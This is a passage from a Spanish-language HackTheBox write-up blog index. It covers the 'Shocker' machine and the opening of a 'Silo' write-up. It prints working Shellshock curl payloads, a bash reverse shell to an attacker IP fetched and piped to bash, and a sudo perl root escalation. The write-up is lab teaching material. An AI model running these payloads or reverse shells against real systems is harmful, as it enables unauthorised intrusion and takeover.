seconds‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄListos, tenemos:       Puerto   Descripci√≥n         80   HTTP       2222   Por ahora no lo sabemos, pero podemos pensar en que pueda estar relacionado con SSH   Ahora hagamos un escaneo de scripts y versiones, as√≠ tenemos profundizamos en cada puerto: ‚ù≠ nmap -p80,2222 -sC -sV 10. 10. 10. 56 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScan ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ    ‚îÇ File: portScan‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  1  ‚îÇ # Nmap 7. 80 scan initiated Thu Apr 22 25:25:25 2021 as: nmap -p80,2222 -sC -sV -oN portScan 10. 10. 10. 56  2  ‚îÇ Nmap scan report for 10. 10. 10. 56  3  ‚îÇ Host is up (0. 19s latency).  4  ‚îÇ  5  ‚îÇ PORT   STATE SERVICE VERSION  6  ‚îÇ 80/tcp  open http  Apache httpd 2. 4. 18 ((Ubuntu))  7  ‚îÇ |_http-server-header: Apache/2. 4. 18 (Ubuntu)  8  ‚îÇ |_http-title: Site doesn't have a title (text/html).  9  ‚îÇ 2222/tcp open ssh   OpenSSH 7. 2p2 Ubuntu 4ubuntu2. 2 (Ubuntu Linux; protocol 2. 0) 10  ‚îÇ | ssh-hostkey:  11  ‚îÇ |  2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) 12  ‚îÇ |  256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) 13  ‚îÇ |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 14  ‚îÇ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 15  ‚îÇ  16  ‚îÇ Service detection performed. Please report any incorrect results at https://nmap. org/submit/ .  17  ‚îÇ # Nmap done at Thu Apr 22 25:25:25 2021 -- 1 IP address (1 host up) scanned in 17. 76 seconds‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄObtenemos:       Puerto   Servicio   Versi√≥n         80   HTTP   Apache httpd 2. 4. 18       2222   SSH   (Confirmamos) OpenSSH 7. 2p2   ¬°Listo, a darle pues! ‚Ä¶ Puerto 80 ‚åñ: Jmm, nada interesante, validando el c√≥digo fuente tampoco vemos nada, hagamos fuzzing a ver si hay algo escondido a la vista: ‚ù≠ dirsearch. py -u http://10. 10. 10. 56/ -q403 - 297B - http://10. 10. 10. 56/. ht_wsr. txt403 - 300B - http://10. 10. 10. 56/. htaccess. bak1403 - 300B - http://10. 10. 10. 56/. htaccess. orig403 - 302B - http://10. 10. 10. 56/. htaccess. sample403 - 300B - http://10. 10. 10. 56/. htaccess. save403 - 298B - http://10. 10. 10. 56/. htaccessBAK403 - 298B - http://10. 10. 10. 56/. htaccessOLD403 - 301B - http://10. 10. 10. 56/. htaccess_extra 403 - 299B - http://10. 10. 10. 56/. htaccessOLD2403 - 300B - http://10. 10. 10. 56/. htaccess_orig403 - 298B - http://10. 10. 10. 56/. htaccess_sc403 - 290B - http://10. 10. 10. 56/. htm403 - 291B - http://10. 10. 10. 56/. html403 - 300B - http://10. 10. 10. 56/. htpasswd_test403 - 296B - http://10. 10. 10. 56/. htpasswds403 - 297B - http://10. 10. 10. 56/. httr-oauth403 - 294B - http://10. 10. 10. 56/cgi-bin/200 - 137B - http://10. 10. 10. 56/index. html403 - 299B - http://10. 10. 10. 56/server-statusNada relevante a la vista, pero profundizando en lo √∫nico que tenemos, vemos el directorio cgi-bin/, entendamos de que se trata:  CGI (Common Gateway Interface) es un m√©todo por el cual un servidor web puede interactuar con programas externos de generaci√≥n de contenido, a ellos nos referimos com√∫nmente como programas CGI o scripts CGI. Es el m√©todo m√°s com√∫n y sencillo de mostrar contenido din√°mico en su sitio web. Apache - CGI. Entonces el servidor env√≠a las solicitudes del cliente a un programa externo, el programa en cuesti√≥n puede estar escrito en cualquier lenguaje que sea soportado pro el servidor, que por lo general son lenguajes de scripting.  El CGI es utilizado com√∫nmente para contadores, bases de datos, motores de b√∫squeda, formul√°rios, generadores de email autom√°tico, foros de discusi√≥n, chats, comercio electr√≥nico, rotadores y mapas de im√°genes, juegos en l√≠nea y otros. Esta tecnolog√≠a tiene la ventaja de correr en el servidor cuando el usuario lo solicita por lo que es dependiente del servidor y no de la computadora del usuario. CGI Intro. Bien, hablan de scripts y programas alojados por el recurso cgi, as√≠ que podemos probar un fuzz sobre el recurso‚Ä¶ Pero no encontramos nada, si recordamos nos hablaban de lenguajes de scripting, entonces podemos probar a crearnos un archivo con extensiones de lenguajes y volver a validar el fuzzeo:  Encontrar URL del cgi-bin (vemos algunos lenguajes para tener en cuenta). ‚ù≠ cat extensions. txt ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ    ‚îÇ File: extensions. txt‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  1  ‚îÇ php  2  ‚îÇ sh  3  ‚îÇ bash  4  ‚îÇ cgi  5  ‚îÇ pl  6  ‚îÇ c  7  ‚îÇ ccp  8  ‚îÇ py‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄY ahora con wfuzz: ‚ù≠ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common. txt -w extensions. txt http://10. 10. 10. 56/cgi-bin/FUZZ. FUZ2ZDonde el primer FUZZ hace referencia a cada linea del archivo common. txt y el segundo FUZZ (FUZ2Z) a cada linea del archivo extensions. txt: ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 56/cgi-bin/FUZZ. FUZ2ZTotal requests: 37264=====================================================================ID      Response  Lines  Word    Chars    Payload=====================================================================. . . . . . . . . 000034130:  200    7 L   17 W    118 Ch    user - sh Perfecto, tenemos un archivo llamado user. sh, si lo visitamos desde la web nos lo descarga, su contenido es simplemente: ‚ù≠ cat user. sh ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ    ‚îÇ File: user. sh‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  1  ‚îÇ Content-Type: text/plain  2  ‚îÇ  3  ‚îÇ Just an uptime test script  4  ‚îÇ  5  ‚îÇ 12:36:04 up 1:35, 0 users, load average: 0. 00, 0. 01, 0. 00‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄJmmm, pero ¬øqu√© podemos hacer con esto? Haciendo una b√∫squeda sencilla en Google como ‚Äúcgi-bin exploit‚Äù obtenemos un mont√≥n de respuestas hablando de una vulnerabilidad llamada Shellshock, profundizando‚Ä¶ Shellshock: Me gusto esta intro de securityhacklabs para explicar Apache y CGI, as√≠ que me la robo :P  Apache es un servidor web multiplataforma de c√≥digo abierto desarrollado por la Apache Software Foundation. Es robusto con caracter√≠sticas tales como alojamiento virtual, esquemas de autenticaci√≥n, SSL y TLS, mensajes de error personalizados y compatibilidad con m√∫ltiples lenguajes de programaci√≥n. Apache tambi√©n tiene un m√≥dulo llamado mod_cgi que maneja la ejecuci√≥n de scripts de Common Gateway Interface (CGI). Explotando Shellshock. Shellshock como su nombre nos spoilea, se basa en la Shell (en t√©rminos entendibles en la famosa bash), un int√©rprete que esta por lo general en todos los sistemas *Unix. Lo que hace la vulnerabilidad es aprovechar las variables de entorno para definir funciones y jugar a agregar comandos as√≠ la funci√≥n ya se haya terminado de procesar :P Pa leer:  Shellshock, la grave vulnerabilidad en Bash.  CVE-2014-6271.  Shellshock - como explotarla en remoto.  Exploit Bash Shellshock. ‚Ä¶ Explotaci√≥n #: Entonces, podemos validar esta vulnerabilidad de manera sencilla mediante cURL probando cositas de esta gu√≠a: ‚ù≠ curl -H 'User-Agent: () { :; }; echo  VULNERABLE TO SHELLSHOCK ' http://10. 10. 10. 56/cgi-bin/user. shY nos responde: &lt;!DOCTYPE HTML PUBLIC  -//IETF//DTD HTML 2. 0//EN &gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;500 Internal Server Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Internal Server Error&lt;/h1&gt;&lt;p&gt;The server encountered an internal error ormisconfiguration and was unable to completeyour request. &lt;/p&gt;&lt;p&gt;Please contact the server administrator at webmaster@localhost to inform them of the time this error occurred, and the actions you performed just before this error. &lt;/p&gt;&lt;p&gt;More information about this error may be availablein the server error log. &lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2. 4. 18 (Ubuntu) Server at 10. 10. 10. 56 Port 80&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;Podr√≠amos pensar que no es vulnerable, pero leyendo m√°s posts encontramos que si le agregamos m√°s definiciones de echo; antes de lo que queremos ejecutar puede llegar a rular (servir):  Exploiting Shellshock (with extra echo;). ‚ù≠ curl -H 'User-Agent: () { :; }; echo; echo  VULNERABLE TO SHELLSHOCK ' http://10. 10. 10. 56/cgi-bin/user. shY responde: VULNERABLE TO SHELLSHOCKContent-Type: text/plainJust an uptime test script 13:25:00 up 2:23, 0 users, load average: 0. 00, 0. 00, 0. 00Bien, probablemente tenemos ejecuci√≥n de comandos, validemos el id del usuario que est√© ejecutando el servicio web: ‚ù≠ curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://10. 10. 10. 56/cgi-bin/user. shuid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)Perfectooooooooooooooooooooo üòØ, confirmado. Ahora simplemente intentemos entablar una Reverse Shell ;) Validamos que exista cURL en la m√°quina: ‚ù≠ curl -H 'User-Agent: () { :; }; echo; /usr/bin/which curl' http://10. 10. 10. 56/cgi-bin/user. sh/usr/bin/curlNos creamos un archivo que tenga los comandos que queramos ejecutar, para que cuando hagamos la petici√≥n desde la m√°quina a √©l le pasemos el binario bash al final y as√≠ interprete el contenido: ‚ù≠ cat rev. sh #!/bin/bash/bin/bash -i &gt;&amp; /dev/tcp/10. 10. 14. 15/4433 0&gt;&amp;1Levantamos un server web: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Y nos ponemos en escucha: ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . Y desde el Shellshock le indicamos: ‚ù≠ curl -H 'User-Agent: () { :; }; echo; /usr/bin/curl http://10. 10. 14. 15:8000/rev. sh | /bin/bash' http://10. 10. 10. 56/cgi-bin/user. shY obtenemos: Una sesi√≥n como shelly :) Hagamos tratamiento de la TTY r√°pidamente (hay varias formas, a m√≠ me gusta de la siguiente), as√≠ evitamos perder la consola si damos CTRL + C y adem√°s podemos movernos c√≥modamente entre comandos:  En la Shell escribimos: script /dev/null -c bash.  Ahora hacemos CTRL + Z, lo que enviara la Shell a un estado ‚Äúen pausa‚Äù por as√≠ decirlo y nos llevara a nuestra terminal normalita.  Escribimos: stty raw -echo; fg.  Escribimos: reset.  Escribimos: xterm.  Ya tendr√≠amos nuestra Shell interactiva, pero arreglemos unos valores y el tama√±o de la terminal: Escribimos: export TERM=xterm.  Escribimos: export SHELL=bash.  Abrimos una nueva terminal de tama√±o completo y escribimos stty -a, tomamos esos valores y en la Shell de la m√°quina escribimos: stty rows &lt;rows&gt; columns &lt;columns&gt;, validamos que el tama√±o est√© bien ejecutando nano. (Podr√≠as validar el nano tambi√©n antes de hacer esto, as√≠ vez el cambio). Sigamos‚Ä¶ Escalada de privilegios #: Si vemos que permisos tiene shelly para ejecutar comandos en el sistema como otros usuarios encontramos: shelly@Shocker:/home/shelly$ sudo -lMatching Defaults entries for shelly on Shocker:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser shelly may run the following commands on Shocker:  (root) NOPASSWD: /usr/bin/perlPuede ejecutar el binario /usr/bin/perl como el usuario root sin necesidad de ingresar contrase√±a, esto mediante sudo. Si vamos al repo (GTFOBins) que tiene un montoooooooon de info sobre como explotar vaaarios binarios, nos encontramos con: Bien, sencillamente pas√°ndole esa instrucci√≥n deber√≠amos obtener una Shell como el usuario (en este caso) root, probemos: shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec  /bin/bash ;' Perfectoooo, ya seriamos root y podr√≠amos hacer lo que quisi√©ramos (Claramente puedes jugar con reverse shells de perl y dem√°s cositas para entablar una sesi√≥n como root , es cuesti√≥n de jugar y no quedarse solo con una opci√≥n. ) Solo nos quedar√≠a ver las flags‚Ä¶ ‚Ä¶ Super interesante la vulnerabilidad del Shellshock, ya siempre que encontremos un directorio cgi-bin/ sabemos que debemos buscar posiblemente algo relacionado con ella y adem√°s aprendimos que puede parecer que ha fallado, pero simplemente deber√≠amos agregarle la sentencia echo; e ir probando :P Y weno, como siempre much√≠simas gracias por pasarse yyyyyyyyyyyyy a seguir rompiendo todo!! ‚ù§Ô∏è "
    }, {
    "id": 56,
    "url": "http://localhost:4000/htb/silo",
    "title": "HackTheBox - Silo",
    "body": "2021/04/21 - M√°quina Windows nivel medio, iremos de cabeza contra Oracle TNS, nos perderemos en un CVE :P, jugaremos con la base de datos y veremos que podemos ser los reyes de ella (sysdba), usaremos la herramienta odat. py pa (entre otras cositas) subir archivos, ¬øqu√© subir√≠as? Finalmente tendremos un volc√°n de memoria e. e del cual nos aprovecharemos para obtener los registros SAM y SYSTEM del sistema, lo dem√°s son juegos de mesa.  TL;DR (Spanish writeup): Creada por: egre55. ¬°AJ√Å como es entonceeeeeees!! Bueeeno, inicialmente tendremos el servicio Oracle TNS y la herramienta odat. py que tiene muuuuuuuuuuuchos ataques contra ese servicio. Nos apoyaremos en √©l para poder subir cualquier tipo de archivo al sistema (todo mediante el par√°metro sysdba), finalmente subiremos una web-Shell y as√≠ entablaremos una reverse Shell como el usuario iis apppool\defaultapppool. Nos toparemos con un volcado de memoria del sistema, jugaremos con la herramienta volatility para encontrar procesos que se ejecutaron, rutas de los mismos y al final encontraremos las rutas de los registros, esto nos servir√° para extraer las direcciones en memoria de los mismos y quedarnos con dos importantes: registro SAM y registro SYSTEM. Con ellos podremos dumpear los hashes de los usuarios del sistema, jugaremos con evil-winrm y winexec para hacer un PassTheHash contra el usuario Administrator y as√≠ conseguir una Shell como √©l en el sistema (: Clasificaci√≥n de la m√°quina: Bastante del lado real ;)  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Soooooooooooooo, veremos:  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Veamos que servicios esta corriendo la m√°quina: ‚ù≠ nmap -p- --open -v 10. 10. 10. 82 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ    ‚îÇ File: initScan‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  1  ‚îÇ # Nmap 7. 80 scan initiated Fri Apr 16 19:43:32 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 82  2  ‚îÇ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)  3  ‚îÇ Host: 10. 10. 10. 82 ()  Status: Up  4  ‚îÇ Host: 10. 10. 10. 82 ()  Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 1521/open/tcp//oracle///, 5985/open/tcp//    ‚îÇ wsman///, 47001/open/tcp//winrm///, 49152/open/tcp//unknown///, 49153/open/tcp//unknown///, 49154/open/tcp//unknown///, 49155/open/tcp//unknown///, 49159/open/tcp//unknown///, 491    ‚îÇ 60/open/tcp//unknown///, 49161/open/tcp//unknown///, 49162/open/tcp/////  5  ‚îÇ # Nmap done at Fri Apr 16 19:56:42 2021 -- 1 IP address (1 host up) scanned in 789. 59 